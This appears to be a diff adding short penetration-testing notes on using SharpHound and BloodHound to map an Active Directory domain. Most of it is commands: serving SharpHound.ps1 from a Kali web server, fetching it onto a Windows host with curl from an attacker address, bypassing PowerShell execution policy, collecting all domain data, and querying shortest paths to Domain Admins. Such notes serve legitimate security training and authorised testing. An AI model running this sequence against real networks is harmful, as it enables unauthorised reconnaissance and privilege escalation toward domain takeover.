@@ -1,0 +1,24 @@
+Use SharpHound.ps1 to gather data for Bloodhound 
+
+# Move SharpHound.ps1 to hosting directory before transfer and start python webserver
+kali~# cp /usr/share/sharphound/SharpHound.ps1 ./
+kali~# python -m http.server 80
+
+# Move SharpHound to Windows machine and Import module into Powershell and execute
+C:\Users\david\Desktop> curl http://$IP/SharpHound.ps1 -o C:\Users\david\Desktop\SharpHound.ps1
+C:\Users\david\Desktop> powershell -ep bypass
+PS C:\Users\david\Desktop> Import-Module .\Sharphound.ps1
+PS C:\Users\david\Desktop> Invoke-BloodHound -CollectionMethod All -ZipFileName output.zip
+
+# After moving the output.zip file back to kali Review in Bloodhound
+kali~# sudo neo4j start			Login(neo4j:neo4j) Password required for bloodhound
+kali~# http://localhost:7474
+kali~# bloodhound			use the “Upload data” function in the navbar to upload the zip file
+
+*************************
+*************************
+There are many queries to experiment with, start with
+-	Find all Domain Admins under Domain Information under the Analysis tab.
+- Find Shortest Paths to Domain Admins
+- Make sure to right click the objects you own in Bloodhound to use functionality like Shortest Path to Domain Admin from Owned Principals. 
+
